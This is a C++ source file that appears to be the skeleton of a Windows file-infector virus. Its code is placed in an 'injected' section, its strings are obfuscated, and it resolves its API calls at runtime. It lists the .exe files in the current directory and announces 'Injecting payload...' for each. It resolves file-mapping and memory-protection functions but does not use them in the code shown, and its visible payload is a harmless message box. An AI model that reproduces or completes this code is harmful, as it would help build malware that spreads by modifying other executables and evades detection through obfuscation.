#include "payload.h"
#include <Windows.h>
#include "libproc.hpp"

EXTERN_C_START
extern VOID payload();
extern ULONGLONG __end_code;
EXTERN_C_END

__declspec(code_seg("injected")) VOID inj_code_c() {
    __declspec(allocate("injected")) static CONST auto user32_obf = Obfuscated("USER32.DLL");
    __declspec(allocate("injected")) static CONST auto mbTitle_obf = Obfuscated("Hello");
    __declspec(allocate("injected")) static CONST auto mbText_obf = Obfuscated("Hello, world!");
    __declspec(allocate("injected")) static CONST auto fileName_obf = Obfuscated("hello.exe");
    __declspec(allocate("injected")) static CONST auto exeExt_obf = Obfuscated("\\*.exe");
    __declspec(allocate("injected")) static CONST auto mbInjecting_obf =
        Obfuscated("Injecting payload...");
    __declspec(allocate("injected")) static CONST auto errGetDir_obf =
        Obfuscated("Error getting current directory");
    __declspec(allocate("injected")) static CONST auto errAlloc_obf =
        Obfuscated("Error allocating memory");
    __declspec(allocate("injected")) static CONST auto errFindFile_obf =
        Obfuscated("Error finding .exe files");
    CONST Deobfuscator user32_deobf = Deobfuscator(user32_obf);
    CONST Deobfuscator mbTitle_deobf = Deobfuscator(mbTitle_obf);
    CONST Deobfuscator mbText_deobf = Deobfuscator(mbText_obf);
    CONST Deobfuscator fileName_deobf = Deobfuscator(fileName_obf);
    CONST Deobfuscator mbInjecting_deobf = Deobfuscator(mbInjecting_obf);
    CONST Deobfuscator exeExt_deobf = Deobfuscator(exeExt_obf);
    CONST Deobfuscator errGetDir_deobf = Deobfuscator(errGetDir_obf);
    CONST Deobfuscator errAlloc_deobf = Deobfuscator(errAlloc_obf);
    CONST Deobfuscator errFindFile_deobf = Deobfuscator(errFindFile_obf);

    CONST auto pKernel32Dll = GET_DLL(kernel32.dll);
    CONST auto pLoadLibraryA = GET_FUNC(pKernel32Dll, LoadLibraryA);

    CONST auto pUser32Dll = pLoadLibraryA(user32_deobf);
    CONST auto pMessageBoxA = GET_FUNC(pUser32Dll, MessageBoxA);
    CONST auto pCreateFileA = GET_FUNC(pKernel32Dll, CreateFileA);
    CONST auto pGetFileSize = GET_FUNC(pKernel32Dll, GetFileSize);
    CONST auto pCreateFileMappingA = GET_FUNC(pKernel32Dll, CreateFileMappingA);
    CONST auto pMapViewOfFile = GET_FUNC(pKernel32Dll, MapViewOfFile);
    CONST auto pVirtualProtect = GET_FUNC(pKernel32Dll, VirtualProtect);
    CONST auto pFlushViewOfFile = GET_FUNC(pKernel32Dll, FlushViewOfFile);
    CONST auto pUnmapViewOfFile = GET_FUNC(pKernel32Dll, UnmapViewOfFile);
    CONST auto pCloseHandle = GET_FUNC(pKernel32Dll, CloseHandle);
    CONST auto pGetCurrentDirectoryA = GET_FUNC(pKernel32Dll, GetCurrentDirectoryA);
    CONST auto pFindFirstFileA = GET_FUNC(pKernel32Dll, FindFirstFileA);
    CONST auto pFindNextFileA = GET_FUNC(pKernel32Dll, FindNextFileA);
    CONST auto pFindClose = GET_FUNC(pKernel32Dll, FindClose);
    // CONST auto pLocalAlloc = GET_FUNC(pKernel32Dll, LocalAlloc);
    // CONST auto pLocalFree = GET_FUNC(pKernel32Dll, LocalFree);

    CHAR sDirName[MAX_PATH];
    DWORD res = pGetCurrentDirectoryA(sizeof(sDirName), sDirName);
    if (res == 0 || res >= sizeof(sDirName)) {
        pMessageBoxA(NULL, errGetDir_deobf, NULL, MB_OK | MB_ICONERROR);
        return;
    }
    my_strcat(sDirName, exeExt_deobf);
    pMessageBoxA(NULL, sDirName, mbTitle_deobf, MB_OK | MB_ICONINFORMATION);

    WIN32_FIND_DATAA findData;
    HANDLE hFind = pFindFirstFileA(sDirName, &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        pMessageBoxA(NULL, errFindFile_deobf, NULL, MB_OK | MB_ICONERROR);
        return;
    }

    do {
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            continue;
        }
        pMessageBoxA(NULL, findData.cFileName, mbInjecting_deobf, MB_OK | MB_ICONINFORMATION);
    } while (pFindNextFileA(hFind, &findData));

    pFindClose(hFind);

    pMessageBoxA(NULL, mbText_deobf, mbTitle_deobf, MB_OKCANCEL | MB_ICONINFORMATION);
}
